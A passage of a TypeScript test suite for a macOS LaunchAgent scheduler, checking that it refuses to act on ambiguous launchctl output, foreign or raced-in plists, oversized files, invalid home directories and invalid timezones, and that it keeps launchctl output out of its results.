  proc.printResult = PRINT_LOADED; // loaded service, but no plist on disk -- an inconsistent, untrusted signal
  const scheduler = makeScheduler(fs, proc);
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "ambiguous-launchctl-output");
  assert.equal(result.changed, false);
  assert.equal(fs.files.size, 0, "no plist was ever written");
  assert.ok(!proc.calls.some((c) => c.argv[0] === "bootstrap"), "never mutates on an ambiguous/inconsistent signal");
});

void test("(final-integration 9) owned+desired plist + loaded -> installed (status and reconcile agree)", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  proc.printResult = PRINT_LOADED;
  proc.calls = [];
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "installed");
  assert.equal(result.changed, false);
  assert.equal(await scheduler.status(), "installed");
});

void test("(final-integration 9) owned+desired plist + absent -> status reports not-loaded, reconcile bootstraps", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(await scheduler.status(), "not-loaded");

  proc.calls = [];
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "installed");
  assert.ok(proc.calls.some((c) => c.argv[0] === "bootstrap"), "reconcile re-bootstraps an absent-but-owned-and-desired service");
});

void test("(final-integration 9) owned plist + ambiguous launchctl -> no mutation (reconcile and status both refuse)", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });

  proc.printResult = PRINT_AMBIGUOUS;
  assert.equal(await scheduler.status(), "ambiguous-launchctl-output");

  proc.calls = [];
  const changed = await scheduler.reconcile({ consent: true, vaultName: "New Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 4, minute: 0 })] });
  assert.equal(changed.status, "ambiguous-launchctl-output");
  assert.equal(changed.changed, false);
  assert.ok(!proc.calls.some((c) => c.argv[0] === "bootout" || c.argv[0] === "bootstrap"));
});

void test("(final-integration 9) foreign plist -> no launchctl mutation ever, from either status() or reconcile()/remove()", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  fs.files.set(PLIST_PATH, "not ours");

  assert.equal(await scheduler.status(), "foreign-conflict");
  assert.equal(proc.calls.length, 0, "status() never even probes launchctl once foreign content is detected by file check alone");

  const reconcileResult = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(reconcileResult.status, "foreign-conflict");
  const removeResult = await scheduler.remove();
  assert.equal(removeResult.status, "foreign-conflict");
  assert.equal(proc.calls.length, 0, "never a single launchctl mutation call against a foreign plist");
});

// ---------------------------------------------------------------------------
// Final-integration requirement 10: fs/process failures caught, bounded, redacted
// ---------------------------------------------------------------------------

void test("(final-integration 10 / last-acceptance 5) a throwing fs.exists is treated as AMBIGUOUS, never coerced to 'removed', and never an unhandled rejection", async () => {
  const fs = new FakeFs();
  fs.existsThrows = true;
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  await assert.doesNotReject(() => scheduler.status());
  assert.equal(await scheduler.status(), "ambiguous-launchctl-output", "an unknown exists() result must never be coerced to 'removed' -- that would let reconcile() potentially install over a path it cannot actually inspect");
});

void test("(final-integration 10) ProcessResult with a non-safe-integer code is rejected as ambiguous, never trusted", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = { code: Number.MAX_SAFE_INTEGER + 10, stdout: "", stderr: "" } as ProcessResult;
  const scheduler = makeScheduler(fs, proc);
  fs.files.set(PLIST_PATH, buildLaunchAgentPlist("V", [{ hour: 3, minute: 0 }], LABEL));
  assert.equal(await scheduler.status(), "ambiguous-launchctl-output");
});

void test("(final-integration 10) an oversized plist on disk is treated as ambiguous, never parsed", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  fs.files.set(PLIST_PATH, "a".repeat(70 * 1024)); // > MAX_PLIST_BYTES
  assert.equal(await scheduler.status(), "ambiguous-launchctl-output");
});

void test("(final-integration 10) raw stdout/stderr from launchctl never surfaces in any BackgroundReconcileResult", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  proc.bootstrapResult = { code: 1, stdout: "SECRET_TOKEN=abc123", stderr: "leaked/path/info here" };
  const scheduler = makeScheduler(fs, proc);
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "load-failed");
  const serialized = JSON.stringify(result);
  assert.ok(!serialized.includes("SECRET_TOKEN"));
  assert.ok(!serialized.includes("leaked/path/info"));
});

// ---------------------------------------------------------------------------
// Final-integration requirement 11: revalidate ownership immediately before destructive action
// ---------------------------------------------------------------------------

void test("(final-integration 11) a foreign replacement detected immediately before the atomic rename aborts the write -- never overwrites it", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "Original", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });

  // Simulate a foreign replacement racing in between the earlier read-and-validate and the
  // destructive write -- swap the file's readFile to return foreign content only once, at the
  // revalidation point right before the write.
  let readCount = 0;
  const originalReadFile = fs.readFile.bind(fs);
  fs.readFile = async (path: string) => {
    if (path === PLIST_PATH) {
      readCount += 1;
      if (readCount === 2) return "someone else's plist, raced in"; // the revalidation read
    }
    return originalReadFile(path);
  };

  proc.printResult = PRINT_LOADED;
  const originalPlist = fs.files.get(PLIST_PATH);
  const result = await scheduler.reconcile({ consent: true, vaultName: "New Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 4, minute: 0 })] });
  assert.equal(result.status, "foreign-conflict");
  assert.equal(result.changed, false);
  // The write was aborted BEFORE ever touching the file -- the actually-persisted bytes are still
  // exactly the pre-race committed plist (the mock only ever faked what readFile RETURNED for the
  // revalidation check; it never actually wrote foreign content into the backing store).
  assert.equal(fs.files.get(PLIST_PATH), originalPlist);
  assert.ok(!fs.files.get(PLIST_PATH)!.includes(encodeURIComponent("New Vault")), "the new-vault content must never have been written");
});

void test("(final-integration 11) a foreign replacement detected immediately before unlink aborts the removal -- never deletes it", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  proc.printResult = PRINT_LOADED;

  let readCount = 0;
  const originalReadFile = fs.readFile.bind(fs);
  fs.readFile = async (path: string) => {
    if (path === PLIST_PATH) {
      readCount += 1;
      if (readCount === 2) return "raced-in foreign content";
    }
    return originalReadFile(path);
  };

  const result = await scheduler.remove();
  assert.equal(result.status, "foreign-conflict");
  assert.equal(result.changed, false);
  assert.ok(fs.files.has(PLIST_PATH), "the raced-in file must still exist -- never unlinked");
});

// ---------------------------------------------------------------------------
// Final-integration requirement 12: system timezone API
// ---------------------------------------------------------------------------

void test("(final-integration 12) reconcile rejects a cadence whose systemTimeZone does not match ReconcileInput.systemTimeZone, even though the branded type alone would allow it via a cast", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  const mismatchedCadence = toSystemLocalWakeCadence({ hour: 3, minute: 0 }, "America/New_York");
  await assert.rejects(
    () => scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [mismatchedCadence] }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
});

void test("(final-integration 12) reconcile rejects an unbranded cadence object smuggled in via a cast (runtime-erasable brand)", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  const forged = { hour: 3, minute: 0 } as unknown as SystemLocalWakeCadence; // no systemTimeZone field at all
  await assert.rejects(
    () => scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [forged] }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
});

void test("(final-integration 12) reconcile rejects a malformed/control-byte ReconcileInput.systemTimeZone", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  await assert.rejects(
    () => scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "", cadences: [cadence({ hour: 3, minute: 0 })] }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
});

void test("(final-integration 12) reconcile accepts consistent cadences whose systemTimeZone matches ReconcileInput.systemTimeZone", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  const nyCadence = toSystemLocalWakeCadence({ hour: 3, minute: 0 }, "America/New_York");
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "America/New_York", cadences: [nyCadence] });
  assert.equal(result.status, "installed");
});

// ---------------------------------------------------------------------------
// Last-acceptance requirement 5: exists() tri-state across every public method
// ---------------------------------------------------------------------------

void test("(last-acceptance 5) reconcile() on a throwing exists() reports ambiguous and performs zero launchctl/write calls", async () => {
  const fs = new FakeFs();
  fs.existsThrows = true;
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "ambiguous-launchctl-output");
  assert.equal(result.changed, false);
  assert.equal(proc.calls.length, 0);
  assert.equal(fs.files.size, 0);
});

void test("(last-acceptance 5) remove() on a throwing exists() reports ambiguous and performs zero launchctl/unlink calls", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });

  fs.existsThrows = true;
  proc.calls = [];
  const result = await scheduler.remove();
  assert.equal(result.status, "ambiguous-launchctl-output");
  assert.equal(result.changed, false);
  assert.equal(proc.calls.length, 0);
  assert.ok(fs.files.has(PLIST_PATH), "the plist must still exist -- never unlinked on an ambiguous exists() read");
});

void test("(last-acceptance 5) status()/reconcile()/remove() never conflate a throwing exists() with a genuinely absent file", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  fs.existsThrows = true;
  assert.notEqual(await scheduler.status(), "removed");
  assert.notEqual((await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] })).status, "installed");
  assert.notEqual((await scheduler.remove()).status, "removed");
});

// ---------------------------------------------------------------------------
// Last-acceptance requirement 6: pre-allocation plist bound (stat before read)
// ---------------------------------------------------------------------------

void test("(last-acceptance 6) an oversized owned plist is never read via readFile -- statSize alone is enough to reject it", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  fs.files.set(PLIST_PATH, buildLaunchAgentPlist("V", [{ hour: 3, minute: 0 }], LABEL));
  fs.statSizeOverride.set(PLIST_PATH, 10 * 1024 * 1024); // far beyond MAX_PLIST_BYTES
  fs.readFileCallCount = 0;

  assert.equal(await scheduler.status(), "ambiguous-launchctl-output");
  assert.equal(fs.readFileCallCount, 0, "readFile must never be called once statSize alone proves the file is oversized");
});

void test("(last-acceptance 6) an unknown/throwing statSize is ambiguous, no mutation, and readFile is never called", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  fs.files.set(PLIST_PATH, buildLaunchAgentPlist("V", [{ hour: 3, minute: 0 }], LABEL));
  fs.statSizeThrows = true;
  fs.readFileCallCount = 0;

  assert.equal(await scheduler.status(), "ambiguous-launchctl-output");
  assert.equal(fs.readFileCallCount, 0);

  const result = await scheduler.reconcile({ consent: true, vaultName: "New", systemTimeZone: "UTC", cadences: [cadence({ hour: 4, minute: 0 })] });
  assert.equal(result.status, "ambiguous-launchctl-output");
  assert.equal(result.changed, false);
});

void test("(last-acceptance 6) the temp-file readback during an atomic write is also stat-bounded before readFile -- a size mismatch aborts without reading", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);

  // Intercept writeFile to also register a WRONG statSize for whatever temp path gets written,
  // simulating a filesystem that reports a mismatched size for the just-written temp file.
  const originalWriteFile = fs.writeFile.bind(fs);
  fs.writeFile = async (path: string, contents: string) => {
    await originalWriteFile(path, contents);
    if (path.includes(".atomic-tmp-")) {
      fs.statSizeOverride.set(path, Buffer.byteLength(contents, "utf8") + 1); // deliberately wrong
    }
  };
  const readFileCallsBefore = fs.readFileCallCount;

  await assert.rejects(() => scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] }));
  assert.equal(fs.readFileCallCount, readFileCallsBefore, "readFile must never be called on the temp file once its stat size mismatches");
  assert.equal(fs.files.has(PLIST_PATH), false, "nothing was ever committed");
});

// ---------------------------------------------------------------------------
// Last-acceptance requirement 7: revalidate at rename, not before temp work
// ---------------------------------------------------------------------------

void test("(last-acceptance 7) fresh install: a foreign file appearing WHILE the temp write/readback is in flight aborts the rename, never overwrites it", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);

  // Simulate the destination becoming present (a foreign file raced in) exactly once the temp
  // write itself lands -- i.e. AFTER writeAndVerifyTemp's own work started, before the rename.
  const originalWriteFile = fs.writeFile.bind(fs);
  fs.writeFile = async (path: string, contents: string) => {
    await originalWriteFile(path, contents);
    if (path.includes(".atomic-tmp-")) {
      fs.files.set(PLIST_PATH, "a foreign file that raced in during temp work");
    }
  };

  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "foreign-conflict");
  assert.equal(result.changed, false);
  assert.equal(fs.files.get(PLIST_PATH), "a foreign file that raced in during temp work", "the raced-in foreign content must be untouched -- never overwritten by the rename");
});

void test("(last-acceptance 7) replacement: the destination changing WHILE the temp write/readback is in flight aborts the rename, never overwrites it", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "Original", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  proc.printResult = PRINT_LOADED;

  const originalWriteFile = fs.writeFile.bind(fs);
  fs.writeFile = async (path: string, contents: string) => {
    await originalWriteFile(path, contents);
    if (path.includes(".atomic-tmp-")) {
      // The destination changes to something ELSE mid-flight (still "owned" content, but for a
      // DIFFERENT vault than what reconcileInner captured as `expected.priorBytes`).
      fs.files.set(PLIST_PATH, buildLaunchAgentPlist("Raced In Vault", [{ hour: 9, minute: 0 }], LABEL));
    }
  };

  const result = await scheduler.reconcile({ consent: true, vaultName: "New Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 4, minute: 0 })] });
  assert.equal(result.status, "foreign-conflict");
  assert.equal(result.changed, false);
  assert.ok(fs.files.get(PLIST_PATH)!.includes(encodeURIComponent("Raced In Vault")), "the raced-in content must be untouched -- never overwritten by the rename");
});

void test("(last-acceptance 7) with nothing racing in, the temp work still completes normally and the rename lands", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "installed");
  assert.equal(result.changed, true);
  assert.ok(fs.files.has(PLIST_PATH));
});

// ---------------------------------------------------------------------------
// Last-acceptance requirement 8: home/timezone validation
// ---------------------------------------------------------------------------

void test("(last-acceptance 8) userHomeDir rejects the filesystem root and system/shared directory roots", () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  for (const badHome of ["/", "/Library", "/System", "/private/var/whatever", "/tmp", "/tmp/evil", "/etc", "/usr/local", "/Applications"]) {
    assert.throws(
      () => new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: badHome, installationId: INSTALLATION_ID, fs, process: proc }),
      (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
      `expected userHomeDir "${badHome}" to be rejected`,
    );
  }
});

void test("(last-acceptance 8) userHomeDir rejects a bare top-level directory with too few segments to be a specific user's home", () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  assert.throws(
    () => new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: "/Users", installationId: INSTALLATION_ID, fs, process: proc }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
});

void test("(last-acceptance 8) userHomeDir accepts a plausible real user home, including a network-mounted one under /Volumes", () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  assert.doesNotThrow(() => new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: "/Users/alice", installationId: INSTALLATION_ID, fs, process: proc }));
  assert.doesNotThrow(() => new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: "/home/alice", installationId: INSTALLATION_ID, fs, process: proc }));
  // A network-mounted home (e.g. an NFS/AFP home directory) legitimately lives under /Volumes on
  // macOS -- this is a plausible real user home, never a "tmp lookalike," and must not be rejected.
  assert.doesNotThrow(() => new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: "/Volumes/HomeServer/alice", installationId: INSTALLATION_ID, fs, process: proc }));
});

void test("(last-acceptance 8) reconcile() rejects a fake/non-IANA systemTimeZone via real Intl validation, not just a non-empty marker", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  await assert.rejects(
    () => scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "Not/A_Real_Zone_XYZ", cadences: [cadence({ hour: 3, minute: 0 })] }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
  await assert.rejects(
    () => scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "+05:00", cadences: [cadence({ hour: 3, minute: 0 })] }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
});

void test("(last-acceptance 8) reconcile() accepts a real IANA systemTimeZone with matching cadence markers", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  const tokyoCadence = toSystemLocalWakeCadence({ hour: 3, minute: 0 }, "Asia/Tokyo");
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "Asia/Tokyo", cadences: [tokyoCadence] });
  assert.equal(result.status, "installed");
});

// ---------------------------------------------------------------------------
// Last-acceptance requirement 9: status()/ops serialization
// ---------------------------------------------------------------------------

void test("(last-acceptance 9) status() is serialized behind the same lane as reconcile()/remove() -- it cannot observe a mid-flight reconcile", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "Original", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  proc.printResult = PRINT_LOADED;

  // Fire a reconcile (which internally does print -> bootout -> write -> bootstrap, several
  // awaited steps) and a status() call concurrently. status() must observe either the fully
  // pre-reconcile state or the fully post-reconcile state -- never something in between.
  const [reconcileResult, statusResult] = await Promise.all([
    scheduler.reconcile({ consent: true, vaultName: "New Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 4, minute: 0 })] }),
    scheduler.status(),
  ]);
  assert.ok(["installed", "load-failed", "unload-failed"].includes(reconcileResult.status));
  assert.ok(["installed", "not-loaded", "ambiguous-launchctl-output"].includes(statusResult), "status() must observe a coherent, fully-settled state");
});

void test("(last-acceptance 9) status() still performs no mutation and reports the no-plist+loaded-service case as ambiguous, and owned+absent as not-loaded", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_LOADED; // loaded, but no plist on disk
  const scheduler = makeScheduler(fs, proc);
  assert.equal(await scheduler.status(), "ambiguous-launchctl-output");
  assert.equal(fs.files.size, 0);

  fs.files.set(PLIST_PATH, buildLaunchAgentPlist("V", [{ hour: 3, minute: 0 }], LABEL));
  proc.printResult = PRINT_ABSENT;
  assert.equal(await scheduler.status(), "not-loaded");
  assert.equal(proc.calls.filter((c) => c.argv[0] !== "print").length, 0, "status() never issues a bootstrap/bootout call");
});

void test("(last-acceptance 5) systemTimeZone validation stays correct across many distinct zones (bounded cache never causes a false accept/reject)", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  const realZones = ["America/New_York", "Asia/Tokyo", "Europe/London", "Pacific/Kiritimati", "Australia/Sydney", "Africa/Cairo", "America/Sao_Paulo", "Asia/Kolkata"];
  for (let round = 0; round < 10; round += 1) {
    for (const zone of realZones) {
      const zoneCadence = toSystemLocalWakeCadence({ hour: 3, minute: 0 }, zone);
      const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: zone, cadences: [zoneCadence] });
      assert.notEqual(result.status, "ambiguous-launchctl-output", `zone "${zone}" round ${round} must still validate correctly`);
    }
  }
  await assert.rejects(
    () => scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "Still/Not_A_Real_Zone", cadences: [cadence({ hour: 3, minute: 0 })] }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
});
